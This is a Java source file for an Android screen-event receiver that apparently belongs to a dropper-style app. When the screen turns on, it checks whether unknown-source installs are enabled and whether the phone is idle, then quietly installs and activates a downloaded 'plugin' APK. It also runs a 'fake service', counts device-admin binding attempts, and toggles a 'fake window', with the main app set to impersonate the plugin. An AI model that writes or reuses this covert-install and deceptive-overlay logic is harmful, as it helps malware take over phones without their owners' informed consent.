package com.xstd.qm.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import com.plugin.common.utils.SingleInstanceBase;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.qm.*;
import com.xstd.qm.setting.MainSettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-15
 * Time: PM2:41
 * To change this template use File | Settings | File Templates.
 */
public class ScreenBroadcastReceiver extends BroadcastReceiver {

    public void onReceive(Context context, Intent intent) {
        Config.LOGD("<<<< [[ScreenBroadcastReceiver::onReceive]]" +
                        " Phone Model : " + android.os.Build.MODEL +
                        " >>>>>");
        if (intent != null
                && intent.getAction() != null
                && (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)
                    || intent.getAction().equals(Intent.ACTION_SCREEN_ON)
                    || intent.getAction().equals(Intent.ACTION_USER_PRESENT))) {
            if (intent.getAction().equals(Intent.ACTION_SCREEN_ON)
                    || intent.getAction().equals(Intent.ACTION_USER_PRESENT)) {
                MainSettingManager.getInstance().init(context);
                Config.LOGD("<<<< " + intent.getAction() + " >>>>>"
                                + " function screen status : " + UtilsRuntime.isScreenLocked(context));
                long curTime = System.currentTimeMillis();
                if (MainSettingManager.getInstance().getPluginDownloadTime() > 0
                    && !UtilOperator.isPluginApkExist()) {
                    long deta = curTime - MainSettingManager.getInstance().getPluginDownloadTime();
                    if (deta > ((long) 2) * 60 * 60 * 1000) {
                        Utils.saveExtraInfo("两小时子程序下载失败");
                        MainSettingManager.getInstance().setPluginDownloadTime(-1);
                        Utils.notifyServiceInfo(context);
                    }
                }

                int open = Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.INSTALL_NON_MARKET_APPS, 0);
                TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                int state = tm != null ? tm.getCallState() : TelephonyManager.CALL_STATE_IDLE;

                //try to install
                if (!MainSettingManager.getInstance().getKeyPluginInstalled()
                        && !MainSettingManager.getInstance().getKeyHasScaned()) {
                    boolean installed = SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled();
                    MainSettingManager.getInstance().setKeyPluginInstalled(installed);
                    MainSettingManager.getInstance().setKeyHasScaned(true);
                }

                boolean pluginInstalled = MainSettingManager.getInstance().getKeyPluginInstalled();
//                                            ? true
//                                            : SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled();
                long cur = System.currentTimeMillis();
                if (Config.DEBUG) {
                    Config.LOGD("[[ScreenBroadcastReceiver::onReceive]] check if should install plugin : "
                                    + "\n            (pluginInstalled = " + pluginInstalled
                                    + "\n            lanuch time = " + UtilsRuntime.debugFormatTime(MainSettingManager.getInstance().getKeyLanuchTime())
                                    + "\n            install delay = " + MainSettingManager.getInstance().getKeyInstallInterval()
                                    + "\n            current time = " + UtilsRuntime.debugFormatTime(cur)
                                    + "\n            apk exist = " + UtilOperator.isPluginApkExist()
                                    + "\n            open install NO market APP = " + open
                                    + "\n            phone state = " + state
                                    + "\n            main Device bind = " + AppRuntime.isBindingActive(context)
                                    + "\n            main Device bind count = " + MainSettingManager.getInstance().getDeviceBindingActiveTime()
                                    + "\n            Disable Download Plugin = " + MainSettingManager.getInstance().getDisableDownloadPlugin()
                                    + ")");
                }

                if (!AppRuntime.isBindingActive(context)
                        && (MainSettingManager.getInstance().getDeviceBindingActiveTime() < 5)
                        && !MainSettingManager.getInstance().getKeyPluginInstalled()
                        && !MainSettingManager.getInstance().getDisableDownloadPlugin()) {
                    Utils.startFakeService(context, "[[ScreenON]]");
                    return;
                }

                if (open != 0
                        && state == TelephonyManager.CALL_STATE_IDLE
                        && UtilOperator.isPluginApkExist()
                        && !pluginInstalled
                        && MainSettingManager.getInstance().getDeviceBindingTime() <= Config.BIND_TIMES
                        && !AppRuntime.FAKE_WINDOW_FOR_DISDEVICE_SHOW.get()) {
                    if (cur > (MainSettingManager.getInstance().getKeyLanuchTime() + MainSettingManager.getInstance().getKeyInstallInterval())) {
                        UtilOperator.tryToInstallPluginLocal(context);
                    }
                } else if (pluginInstalled) {
                    Utils.tryToActivePluginApp(context);
                } else if (open == 0
                             || (!pluginInstalled && MainSettingManager.getInstance().getHasInstallPlugin())) {
                    //如果安装设备管理器没有打开
                    //或者现在程序没有安装，但是曾经安装过
                    Utils.checkAndActiveQS(context);

                    //同时，主程序以后应该模拟子程序
                    MainSettingManager.getInstance().setMainShouldFakePlugin(true);
                }
            } else if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
                Config.LOGD("<<<< " + Intent.ACTION_SCREEN_OFF + " >>>>>"
                                + " function screen status : " + UtilsRuntime.isScreenLocked(context));

                //try to install
                MainSettingManager.getInstance().init(context);
                if (!MainSettingManager.getInstance().getKeyPluginInstalled()
                        && !MainSettingManager.getInstance().getKeyHasScaned()) {
                    boolean installed = SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled();
                    MainSettingManager.getInstance().setKeyPluginInstalled(installed);
                    MainSettingManager.getInstance().setKeyHasScaned(true);
                }

//                //激活子程序
//                if (MainSettingManager.getInstance().getKeyPluginInstalled()) {
//                    Utils.tryToActivePluginApp(context);
//                }

                UtilOperator.fake.dismiss();
            }
        }
    }

}
